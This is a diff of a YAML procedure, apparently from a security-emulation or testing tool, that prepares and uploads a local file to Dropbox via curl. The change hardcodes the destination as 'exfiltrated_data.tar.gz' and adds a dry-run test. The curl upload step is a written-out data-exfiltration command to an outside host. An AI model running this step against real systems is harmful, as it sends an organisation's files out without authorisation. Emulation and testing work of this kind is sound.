@@ -34,9 +34,9 @@ steps:
   - name: Verify file exists
     type: command
     executor: bash
-    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    command: "test -f '{{ args.file_path }}' || (echo 'File not found'; exit 1)"
     cleanup: false
-  
+
   - name: Get file statistics
     type: command
     executor: bash
@@ -46,7 +46,7 @@ steps:
       echo "  Size: $(du -h '{{ args.file_path }}' | cut -f1)"
       echo "  Target path: {{ args.dropbox_path }}"
       filesize=$(stat -f%z '{{ args.file_path }}' 2>/dev/null || stat -c%s '{{ args.file_path }}')
-      chunks=$((filesize / {{ args.chunk_size }} + 1))
+      chunks=$((filesize / 8388608 + 1))
       echo "  Upload chunks: $chunks"
     cleanup: false
   
@@ -54,15 +54,15 @@ steps:
     type: command
     executor: bash
     command: |
-      cat > /tmp/dropbox_upload_spec.json << 'JSON'
-{
-  "path": "{{ args.dropbox_path }}",
-  "mode": "add",
-  "autorename": true,
-  "mute": false,
-  "strict_conflict": false
-}
-JSON
+      cat > /tmp/dropbox_upload_spec.json << 'DROPBOX_JSON'
+      {
+        "path": "/Backups/exfiltrated_data.tar.gz",
+        "mode": "add",
+        "autorename": true,
+        "mute": false,
+        "strict_conflict": false
+      }
+      DROPBOX_JSON
       echo "API request prepared"
     cleanup: false
   
@@ -83,7 +83,7 @@ JSON
         echo "  Dropbox-API-Arg: [SPEC]"
       else
         curl -X POST https://content.dropboxapi.com/2/files/upload \
-          -H "Authorization: Bearer {{ args.dropbox_token }}" \
+          -H 'Authorization: Bearer TOKEN' \
           -H "Dropbox-API-Arg: $(cat /tmp/dropbox_upload_spec.json)" \
           -H "Content-Type: application/octet-stream" \
           --data-binary @'{{ args.file_path }}'
@@ -93,12 +93,12 @@ checks:
   - name: File accessible
     description: Verify file for upload
     type: command
-    command: test -r '{{ args.file_path }}'
-  
+    command: "test -r '{{ args.file_path }}'"
+
   - name: Valid Dropbox path
     description: Verify Dropbox path format
     type: command
-    command: echo '{{ args.dropbox_path }}' | grep -qE '^/' && echo "Valid path"
+    command: "echo '{{ args.dropbox_path }}' | grep -qE '^/' && echo 'Valid path'"
 tests:
   dry_run:
     - name: Test Dropbox upload (dry-run)
@@ -114,12 +114,12 @@ tests:
           type: command
           executor: bash
           command: |
-            cat > /tmp/dropbox_spec.json << 'JSON'
-{
-  "path": "/Backups/test_dropbox.dat",
-  "mode": "add"
-}
-JSON
+            cat > /tmp/dropbox_spec.json << 'DROPBOX_SPEC'
+            {
+              "path": "/Backups/test_dropbox.dat",
+              "mode": "add"
+            }
+            DROPBOX_SPEC
         
         - name: Show API request
           type: command
